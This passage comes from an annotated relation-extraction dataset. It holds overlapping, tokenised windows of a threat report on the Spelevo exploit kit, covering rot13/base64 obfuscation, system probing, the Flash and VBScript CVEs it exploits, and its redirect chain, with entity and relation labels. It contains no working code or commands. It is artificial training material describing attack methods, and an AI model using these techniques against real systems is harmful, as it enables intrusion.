"evidence": [3, 4], "h": 1, "t": 2}, {"r": "FR", "evidence": [3, 4, 5], "h": 1, "t": 3}, {"r": "EX", "evidence": [4, 5], "t": 2, "h": 3}, {"r": "RD", "evidence": [5], "h": 3, "t": 4}, {"r": "RD", "evidence": [5], "h": 3, "t": 5}, {"r": "FR", "evidence": [5, 6], "h": 3, "t": 6}, {"r": "EX", "evidence": [6], "h": 6, "t": 7}, {"r": "CO", "evidence": [6], "h": 7, "t": 8}, {"r": "EX", "evidence": [7], "h": 9, "t": 10}]}, {"title": "650-5", "sents": [["As", "shown", "below", ",", "at", "the", "top", "of", "the", "document", "there", "appeared", "to", "be", "a", "base64-encoded", "blob", "that", "was", "assigned", "to", "a", "variable", "."], ["However", ",", "there", "was", "a", "failed", "attempt", "at", "decoding", ",", "which", "led", "to", "the", "discovery", "of", "an", "extra", "effort", "by", "the", "attackers", "."], ["When", "we", "began", "analyzing", "the", "code", "on", "the", "page", ",", "we", "found", "why", "the", "decoding", "was", "failing", ":", "The", "actors", "used", "rot13", "encoding", "first", ",", "as", "highlighted", "below", "."], ["Once", "we", "decoded", "the", "rot13", "and", "then", "decoded", "the", "resulting", "base64", ",", "we", "found", "the", "code", "needed", "to", "probe", "the", "system", "to", "determine", "vulnerability", "."], ["This", "code", "will", "probe", "the", "operating", "system", ",", "web", "browser", ",", "and", "plugin", "information", "."], ["If", "a", "vulnerable", "version", "of", "flash", "is", "found", ",", "the", "first", "path", "is", "taken", "which", "likely", "leads", "to", "CVE-2018-15982", ",", "which", "has", "been", "widely", "abused", "by", "exploit", "kits", "including", "Spelevo", "."], ["If", "a", "match", "is", "n't", "found", ",", "the", "second", "path", "is", "followed", ",", "which", "delivers", "another", "exploit", "."], ["We", "began", "to", "analyze", "the", "exploit", ",", "and", "after", "some", "investigation", ",", "determined", "that", "CVE-2018-8174", "is", "being", "exploited", "another", "use-after-free", "vulnerability", "in", "the", "VBScript", "engine", "of", "Internet", "Explorer", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [45, 45], "name": "attackers", "pos": [21, 22], "index": "0_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [66, 66], "name": "actors", "pos": [19, 20], "index": "1_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [99, 99], "name": "vulnerability", "pos": [23, 24], "index": "2_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [102, 102], "name": "code", "pos": [1, 2], "index": "3_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [107, 107], "name": "system", "pos": [6, 7], "index": "4_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [114, 114], "name": "information", "pos": [13, 14], "index": "5_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [127, 127], "name": "path", "pos": [11, 12], "index": "6_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [134, 134], "name": "CVE-2018-15982", "pos": [18, 19], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [145, 145], "name": "Spelevo", "pos": [29, 30], "index": "8_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [156, 156], "name": "path", "pos": [9, 10], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [163, 163], "name": "exploit", "pos": [16, 17], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [170, 170], "name": "exploit", "pos": [5, 6], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [179, 179], "name": "CVE-2018-8174", "pos": [14, 15], "index": "12_0"}]], "labels": [{"r": "RD", "evidence": [1, 2, 3, 4], "h": 0, "t": 4}, {"r": "RD", "evidence": [1, 2, 3, 4], "h": 0, "t": 4}, {"r": "WR", "evidence": [1, 2, 3, 4], "h": 0, "t": 4}, {"r": "CO", "evidence": [1, 2], "h": 0, "t": 1}, {"r": "WR", "evidence": [2, 3], "h": 1, "t": 2}, {"r": "FR", "evidence": [2, 3, 4], "h": 1, "t": 3}, {"r": "EX", "evidence": [3, 4], "t": 2, "h": 3}, {"r": "RD", "evidence": [4], "h": 3, "t": 4}, {"r": "RD", "evidence": [4], "h": 3, "t": 5}, {"r": "FR", "evidence": [4, 5], "h": 3, "t": 6}, {"r": "EX", "evidence": [5], "h": 6, "t": 7}, {"r": "CO", "evidence": [5], "h": 7, "t": 8}, {"r": "EX", "evidence": [6], "h": 9, "t": 10}, {"r": "CO", "evidence": [6, 7], "h": 10, "t": 12}, {"r": "CO", "evidence": [6, 7], "h": 10, "t": 11}]}, {"title": "650-6", "sents": [["However", ",", "there", "was", "a", "failed", "attempt", "at", "decoding", ",", "which", "led", "to", "the", "discovery", "of", "an", "extra", "effort", "by", "the", "attackers", "."], ["When", "we", "began", "analyzing", "the", "code", "on", "the", "page", ",", "we", "found", "why", "the", "decoding", "was", "failing", ":", "The", "actors", "used", "rot13", "encoding", "first", ",", "as", "highlighted", "below", "."], ["Once", "we", "decoded", "the", "rot13", "and", "then", "decoded", "the", "resulting", "base64", ",", "we", "found", "the", "code", "needed", "to", "probe", "the", "system", "to", "determine", "vulnerability", "."], ["This", "code", "will", "probe", "the", "operating", "system", ",", "web", "browser", ",", "and", "plugin", "information", "."], ["If", "a", "vulnerable", "version", "of", "flash", "is", "found", ",", "the", "first", "path", "is", "taken", "which", "likely", "leads", "to", "CVE-2018-15982", ",", "which", "has", "been", "widely", "abused", "by", "exploit", "kits", "including", "Spelevo", "."], ["If", "a", "match", "is", "n't", "found", ",", "the", "second", "path", "is", "followed", ",", "which", "delivers", "another", "exploit", "."], ["We", "began", "to", "analyze", "the", "exploit", ",", "and", "after", "some", "investigation", ",", "determined", "that", "CVE-2018-8174", "is", "being", "exploited", "another", "use-after-free", "vulnerability", "in", "the", "VBScript", "engine", "of", "Internet", "Explorer", "."], ["Once", "the", "system", "has", "been", "compromised", "and", "the", "payload", "is", "delivered", ",", "Spelevo", "does", "something", "a", "bit", "novel", "for", "exploit", "kits", ":", "It", "redirects", "to", "Google", ",", "post", "compromise", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [21, 21], "name": "attackers", "pos": [21, 22], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [42, 42], "name": "actors", "pos": [19, 20], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [75, 75], "name": "vulnerability", "pos": [23, 24], "index": "2_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [78, 78], "name": "code", "pos": [1, 2], "index": "3_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [83, 83], "name": "system", "pos": [6, 7], "index": "4_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [90, 90], "name": "information", "pos": [13, 14], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [103, 103], "name": "path", "pos": [11, 12], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [110, 110], "name": "CVE-2018-15982", "pos": [18, 19], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [121, 121], "name": "Spelevo", "pos": [29, 30], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [132, 132], "name": "path", "pos": [9, 10], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [139, 139], "name": "exploit", "pos": [16, 17], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [146, 146], "name": "exploit", "pos": [5, 6], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [155, 155], "name": "CVE-2018-8174", "pos": [14, 15], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [178, 178], "name": "payload", "pos": [8, 9], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [182, 182], "name": "Spelevo", "pos": [12, 13], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [189, 189], "name": "exploit", "pos": [19, 20], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [192, 192], "name": "It", "pos": [22, 23], "index": "16_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [195, 195], "name": "Google", "pos": [25, 26], "index": "17_0"}]], "labels": [{"r": "RD", "evidence": [0, 1, 2, 3], "h": 0, "t": 4}, {"r": "RD", "evidence": [0, 1, 2, 3], "h": 0, "t": 4}, {"r": "WR", "evidence": [0, 1, 2, 3], "h": 0, "t": 4}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "WR", "evidence": [1, 2], "h": 1, "t": 2}, {"r": "FR", "evidence": [1, 2, 3], "h": 1, "t": 3}, {"r": "EX", "evidence": [2, 3], "t": 2, "h": 3}, {"r": "RD", "evidence": [3], "h": 3, "t": 4}, {"r": "RD", "evidence": [3], "h": 3, "t": 5}, {"r": "FR", "evidence": [3, 4], "h": 3, "t": 6}, {"r": "EX", "evidence": [4], "h": 6, "t": 7}, {"r": "CO", "evidence": [4], "h": 7, "t": 8}, {"r": "EX", "evidence": [5], "h": 9, "t": 10}, {"r": "CO", "evidence": [5, 6], "h": 10, "t": 12}, {"r": "CO", "evidence": [5, 6], "h": 10, "t": 11}, {"r": "RD", "evidence": [7], "t": 13, "h": 14}, {"r": "IJ", "evidence": [7], "h": 15, "t": 17}, {"r": "CO", "evidence": [7], "h": 15, "t": 16}, {"r": "CO", "evidence": [7], "t": 14, "h": 15}]}, {"title": "650-7", "sents": [["When", "we", "began", "analyzing", "the", "code", "on", "the", "page", ",", "we", "found", "why", "the", "decoding", "was", "failing", ":", "The", "actors", "used", "rot13", "encoding", "first", ",", "as", "highlighted", "below", "."], ["Once", "we", "decoded", "the", "rot13", "and", "then", "decoded", "the", "resulting", "base64", ",", "we", "found", "the", "code", "needed", "to", "probe", "the", "system", "to", "determine", "vulnerability", "."], ["This", "code", "will", "probe", "the", "operating", "system", ",", "web", "browser", ",", "and", "plugin", "information", "."], ["If", "a", "vulnerable", "version", "of", "flash", "is", "found", ",", "the", "first", "path", "is", "taken", "which", "likely", "leads", "to", "CVE-2018-15982", ",", "which", "has", "been", "widely", "abused", "by", "exploit", "kits", "including", "Spelevo", "."], ["If", "a", "match", "is", "n't", "found", ",", "the", "second", "path", "is", "followed", ",", "which", "delivers", "another", "exploit", "."], ["We", "began", "to", "analyze", "the", "exploit", ",", "and", "after", "some", "investigation", ",", "determined", "that", "CVE-2018-8174", "is", "being", "exploited", "another", "use-after-free", "vulnerability", "in", "the", "VBScript", "engine", "of", "Internet", "Explorer", "."], ["Once", "the", "system", "has", "been", "compromised", "and", "the", "payload", "is", "delivered", ",", "Spelevo", "does", "something", "a", "bit", "novel", "for", "exploit", "kits", ":", "It", "redirects", "to", "Google", ",", "post", "compromise", "."], ["The", "practical", "effect", "of", "which", "is", "that", "a", "user", "would", "see", "a", "tab", "open", "which", "loads", "the", "gate", ",", "followed", "by", "the", "landing", "page", ",", "an", "exploit", "page", ",", "and", "then", "finally", "to", "Google", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [19, 19], "name": "actors", "pos": [19, 20], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [52, 52], "name": "vulnerability", "pos": [23, 24], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [55, 55], "name": "code", "pos": [1, 2], "index": "2_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [60, 60], "name": "system", "pos": [6, 7], "index": "3_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [67, 67], "name": "information", "pos": [13, 14], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [80, 80], "name": "path", "pos": [11, 12], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [87, 87], "name": "CVE-2018-15982", "pos": [18, 19], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [98, 98], "name": "Spelevo", "pos": [29, 30], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [109, 109], "name": "path", "pos": [9, 10], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [116, 116], "name": "exploit", "pos": [16, 17], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [123, 123], "name": "exploit", "pos": [5, 6], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [132, 132], "name": "CVE-2018-8174", "pos": [14, 15], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [155, 155], "name": "payload", "pos": [8, 9], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [159, 159], "name": "Spelevo", "pos": [12, 13], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [166, 166], "name": "exploit", "pos": [19, 20], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [169, 169], "name": "It", "pos": [22, 23], "index": "15_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [172, 172], "name": "Google", "pos": [25, 26], "index": "16_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [185, 185], "name": "user", "pos": [8, 9], "index": "17_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [194, 194], "name": "gate", "pos": [17, 18], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [203, 203], "name": "exploit page", "pos": [26, 28], "index": "19_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [210, 210], "name": "Google", "pos": [33, 34], "index": "20_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "FR", "evidence": [0, 1, 2], "h": 0, "t": 2}, {"r": "EX", "evidence": [1, 2], "t": 1, "h": 2}, {"r": "RD", "evidence": [2], "h": 2, "t": 3}, {"r": "RD", "evidence": [2], "h": 2, "t": 4}, {"r": "FR", "evidence": [2, 3], "h": 2, "t": 5}, {"r": "EX", "evidence": [3], "h": 5, "t": 6}, {"r": "CO", "evidence": [3], "h": 6, "t": 7}, {"r": "EX", "evidence": [4], "h": 8, "t": 9}, {"r": "CO", "evidence": [4, 5], "h": 9, "t": 11}, {"r": "CO", "evidence": [4, 5], "h": 9, "t": 10}, {"r": "RD", "evidence": [6], "t": 12, "h": 13}, {"r": "IJ", "evidence": [6], "h": 14, "t": 16}, {"r": "CO", "evidence": [6], "h": 14, "t": 15}, {"r": "CO", "evidence": [6], "t": 13, "h": 14}, {"r": "ST", "evidence": [7], "h": 17, "t": 18}, {"r": "FR", "evidence": [7], "h": 17, "t": 19}, {"r": "FR", "evidence": [7], "h": 17, "t": 20}]}, {"title": "650-8", "sents": [["Once", "we", "decoded", "the", "rot13", "and", "then", "decoded", "the", "resulting", "base64", ",", "we", "found", "the", "code", "needed", "to", "probe", "the", "system", "to", "determine", "vulnerability", "."], ["This", "code", "will", "probe", "the", "operating", "system", ",", "web", "browser", ",", "and", "plugin", "information", "."], ["If", "a", "vulnerable", "version", "of", "flash", "is", "found", ",", "the", "first", "path", "is", "taken", "which", "likely", "leads", "to", "CVE-2018-15982", ",", "which", "has", "been", "widely", "abused", "by", "exploit", "kits", "including", "Spelevo", "."], ["If", "a", "match", "is", "n't", "found", ",", "the", "second", "path", "is", "followed", ",", "which", "delivers", "another", "exploit", "."], ["We", "began", "to", "analyze", "the", "exploit", ",", "and", "after", "some", "investigation", ",", "determined", "that", "CVE-2018-8174", "is", "being", "exploited", "another", "use-after-free", "vulnerability", "in", "the", "VBScript", "engine", "of", "Internet", "Explorer", "."], ["Once", "the", "system", "has", "been", "compromised", "and", "the", "payload", "is", "delivered", ",", "Spelevo", "does", "something", "a", "bit", "novel", "for", "exploit", "kits", ":", "It", "redirects", "to", "Google", ",", "post", "compromise", "."], ["The", "practical", "effect", "of", "which", "is", "that", "a", "user", "would", "see", "a", "tab", "open", "which", "loads", "the", "gate", ",", "followed", "by", "the", "landing", "page", ",", "an", "exploit", "page", ",", "and", "then", "finally", "to", "Google", "."], ["Since", "its", "discovery", ",", "it", "has", "gone", "through", "some", "minor", "changes", ",", "including", "modification", "of", "URL", "structure", "and", "some", "obfuscation", "changes", "in", "the", "landing", "and", "exploit", "pages", "themselves", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [23, 23], "name": "vulnerability", "pos": [23, 24], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [26, 26], "name": "code", "pos": [1, 2], "index": "1_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [31, 31], "name": "system", "pos": [6, 7], "index": "2_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [38, 38], "name": "information", "pos": [13, 14], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [51, 51], "name": "path", "pos": [11, 12], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [58, 58], "name": "CVE-2018-15982", "pos": [18, 19], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [69, 69], "name": "Spelevo", "pos": [29, 30], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [80, 80], "name": "path", "pos": [9, 10], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [87, 87], "name": "exploit", "pos": [16, 17], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [94, 94], "name": "exploit", "pos": [5, 6], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [103, 103], "name": "CVE-2018-8174", "pos": [14, 15], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [126, 126], "name": "payload", "pos": [8, 9], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [130, 130], "name": "Spelevo", "pos": [12, 13], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [137, 137], "name": "exploit", "pos": [19, 20], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [140, 140], "name": "It", "pos": [22, 23], "index": "14_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [143, 143], "name": "Google", "pos": [25, 26], "index": "15_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [156, 156], "name": "user", "pos": [8, 9], "index": "16_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [165, 165], "name": "gate", "pos": [17, 18], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [174, 174], "name": "exploit page", "pos": [26, 28], "index": "18_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [181, 181], "name": "Google", "pos": [33, 34], "index": "19_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [198, 198], "name": "URL", "pos": [15, 16], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [208, 208], "name": "exploit pages", "pos": [25, 27], "index": "21_0"}]], "labels": [{"r": "EX", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "RD", "evidence": [1], "h": 1, "t": 2}, {"r": "RD", "evidence": [1], "h": 1, "t": 3}, {"r": "FR", "evidence": [1, 2], "h": 1, "t": 4}, {"r": "EX", "evidence": [2], "h": 4, "t": 5}, {"r": "CO", "evidence": [2], "h": 5, "t": 6}, {"r": "EX", "evidence": [3], "h": 7, "t": 8}, {"r": "CO", "evidence": [3, 4], "h": 8, "t": 10}, {"r": "CO", "evidence": [3, 4], "h": 8, "t": 9}, {"r": "RD", "evidence": [5], "t": 11, "h": 12}, {"r": "IJ", "evidence": [5], "h": 13, "t": 15}, {"r": "CO", "evidence": [5], "h": 13, "t": 14}, {"r": "CO", "evidence": [5], "t": 12, "h": 13}, {"r": "ST", "evidence": [6], "h": 16, "t": 17}, {"r": "FR", "evidence": [6], "h": 16, "t": 18}, {"r": "FR", "evidence": [6], "h": 16, "t": 19}, {"r": "ST", "evidence": [6, 7], "h": 19, "t": 20}, {"r": "RF", "evidence": [6, 7], "h": 19, "t": 20}, {"r": "CO", "evidence": [6, 7], "h": 18, "t": 21}]}, {"title": "650-9", "sents": [["This", "code", "will", "probe", "the", "operating", "system", ",", "web", "browser", ",", "and", "plugin", "information", "."], ["If", "a", "vulnerable", "version", "of", "flash", "is", "found", ",", "the", "first", "path", "is", "taken", "which", "likely", "leads", "to", "CVE-2018-15982", ",", "which", "has", "been", "widely", "abused", "by", "exploit", "kits", "including", "Spelevo", "."], ["If", "a", "match", "is", "n't", "found", ",", "the", "second", "path", "is", "followed", ",", "which", "delivers", "another", "exploit", "."], ["We", "began", "to", "analyze", "the", "exploit", ",", "and", "after", "some", "investigation", ",", "determined", "that", "CVE-2018-8174", "is", "being", "exploited", "another", "use-after-free", "vulnerability", "in", "the", "VBScript", "engine", "of", "Internet", "Explorer", "."], ["Once", "the", "system", "has", "been", "compromised", "and", "the", "payload", "is", "delivered", ",", "Spelevo", "does", "something", "a", "bit", "novel", "for", "exploit", "kits", ":", "It", "redirects", "to", "Google", ",", "post", "compromise", "."], ["The", "practical", "effect", "of", "which", "is", "that", "a", "user", "would", "see", "a", "tab", "open", "which", "loads", "the", "gate", ",", "followed", "by", "the", "landing", "page", ",", "an", "exploit", "page", ",", "and", "then", "finally", "to", "Google", "."], ["Since", "its", "discovery", ",", "it", "has", "gone", "through", "some", "minor", "changes", ",", "including", "modification", "of", "URL", "structure", "and", "some", "obfuscation", "changes", "in", "the", "landing", "and", "exploit", "pages", "themselves", "."], ["Unlike", "the", "Rig", "exploit", "kit", ",", "Spelevo", "is", "being", "hosted", "using", "domains", "instead", "of", "hard", "coded", "IP", "addresses", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "code", "pos": [1, 2], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [6, 6], "name": "system", "pos": [6, 7], "index": "1_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [13, 13], "name": "information", "pos": [13, 14], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [26, 26], "name": "path", "pos": [11, 12], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [33, 33], "name": "CVE-2018-15982", "pos": [18, 19], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [44, 44], "name": "Spelevo", "pos": [29, 30], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [55, 55], "name": "path", "pos": [9, 10], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [62, 62], "name": "exploit", "pos": [16, 17], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [69, 69], "name": "exploit", "pos": [5, 6], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [78, 78], "name": "CVE-2018-8174", "pos": [14, 15], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [101, 101], "name": "payload", "pos": [8, 9], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [105, 105], "name": "Spelevo", "pos": [12, 13], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [112, 112], "name": "exploit", "pos": [19, 20], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [115, 115], "name": "It", "pos": [22, 23], "index": "13_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [118, 118], "name": "Google", "pos": [25, 26], "index": "14_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [131, 131], "name": "user", "pos": [8, 9], "index": "15_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [140, 140], "name": "gate", "pos": [17, 18], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [149, 149], "name": "exploit page", "pos": [26, 28], "index": "17_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [156, 156], "name": "Google", "pos": [33, 34], "index": "18_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [173, 173], "name": "URL", "pos": [15, 16], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [183, 183], "name": "exploit pages", "pos": [25, 27], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [190, 190], "name": "exploit", "pos": [3, 4], "index": "21_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [203, 203], "name": "IP addresses", "pos": [16, 18], "index": "22_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "FR", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "EX", "evidence": [1], "h": 3, "t": 4}, {"r": "CO", "evidence": [1], "h": 4, "t": 5}, {"r": "EX", "evidence": [2], "h": 6, "t": 7}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 8}, {"r": "RD", "evidence": [4], "t": 10, "h": 11}, {"r": "IJ", "evidence": [4], "h": 12, "t": 14}, {"r": "CO", "evidence": [4], "h": 12, "t": 13}, {"r": "CO", "evidence": [4], "t": 11, "h": 12}, {"r": "ST", "evidence": [5], "h": 15, "t": 16}, {"r": "FR", "evidence": [5], "h": 15, "t": 17}, {"r": "FR", "evidence": [5], "h": 15, "t": 18}, {"r": "ST", "evidence": [5, 6], "h": 18, "t": 19}, {"r": "RF", "evidence": [5, 6], "h": 18, "t": 19}, {"r": "RD", "evidence": [5, 6, 7], "h": 18, "t": 21}, {"r": "WR", "evidence": [5, 6, 7], "h": 18, "t": 21}, {"r": "RD", "evidence": [5, 6, 7], "h": 18, "t": 22}, {"r": "EX", "evidence": [5, 6, 7], "h": 18, "t": 21}, {"r": "WR", "evidence": [5, 6, 7], "h": 18, "t": 22}, {"r": "CO", "evidence": [5, 6], "h": 17, "t": 20}, {"r": "RD", "evidence": [6, 7], "h": 20, "t": 22}]}, {"title": "650-10", "sents": [["If", "a", "vulnerable", "version", "of", "flash", "is", "found", ",", "the", "first", "path", "is", "taken", "which", "likely", "leads", "to", "CVE-2018-15982", ",", "which", "has", "been", "widely", "abused", "by", "exploit", "kits", "including", "Spelevo", "."], ["If", "a", "match", "is", "n't", "found", ",", "the", "second", "path", "is", "followed", ",", "which", "delivers", "another", "exploit", "."], ["We", "began", "to", "analyze", "the", "exploit", ",", "and", "after", "some", "investigation", ",", "determined", "that", "CVE-2018-8174", "is", "being", "exploited", "another", "use-after-free", "vulnerability", "in", "the", "VBScript", "engine", "of", "Internet", "Explorer", "."], ["Once", "the", "system", "has", "been", "compromised", "and", "the", "payload", "is", "delivered", ",", "Spelevo", "does", "something", "a", "bit", "novel", "for", "exploit", "kits", ":", "It", "redirects", "to", "Google", ",", "post", "compromise", "."], ["The", "practical", "effect", "of", "which", "is", "that", "a", "user", "would", "see", "a", "tab", "open", "which", "loads", "the", "gate", ",", "followed", "by", "the", "landing", "page", ",", "an", "exploit", "page", ",", "and", "then", "finally", "to", "Google", "."], ["Since", "its", "discovery", ",", "it", "has", "gone", "through", "some", "minor", "changes", ",", "including", "modification", "of", "URL", "structure", "and", "some", "obfuscation", "changes", "in", "the", "landing", "and", "exploit", "pages", "themselves", "."], ["Unlike", "the", "Rig", "exploit", "kit", ",", "Spelevo", "is", "being", "hosted", "using", "domains", "instead", "of", "hard", "coded", "IP", "addresses", "."], ["Talos", "also", "found", "several", "instances", "of", "302", "cushioning", "where", "the", "gates", "and", "exploit", "kits", "will", "leverage", "a", "series", "of", "HTTP", "302", "redirects", "to", "eventually", "point", "to", "the", "landing", "page", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [11, 11], "name": "path", "pos": [11, 12], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [18, 18], "name": "CVE-2018-15982", "pos": [18, 19], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [29, 29], "name": "Spelevo", "pos": [29, 30], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [40, 40], "name": "path", "pos": [9, 10], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [47, 47], "name": "exploit", "pos": [16, 17], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [54, 54], "name": "exploit", "pos": [5, 6], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [63, 63], "name": "CVE-2018-8174", "pos": [14, 15], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [86, 86], "name": "payload", "pos": [8, 9], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [90, 90], "name": "Spelevo", "pos": [12, 13], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [97, 97], "name": "exploit", "pos": [19, 20], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [100, 100], "name": "It", "pos": [22, 23], "index": "10_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [103, 103], "name": "Google", "pos": [25, 26], "index": "11_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [116, 116], "name": "user", "pos": [8, 9], "index": "12_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [125, 125], "name": "gate", "pos": [17, 18], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [134, 134], "name": "exploit page", "pos": [26, 28], "index": "14_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [141, 141], "name": "Google", "pos": [33, 34], "index": "15_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [158, 158], "name": "URL", "pos": [15, 16], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [168, 168], "name": "exploit pages", "pos": [25, 27], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [175, 175], "name": "exploit", "pos": [3, 4], "index": "18_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [188, 188], "name": "IP addresses", "pos": [16, 18], "index": "19_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [201, 201], "name": "gates", "pos": [10, 11], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [203, 203], "name": "exploit", "pos": [12, 13], "index": "21_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [210, 210], "name": "HTTP", "pos": [19, 20], "index": "22_0"}]], "labels": [{"r": "EX", 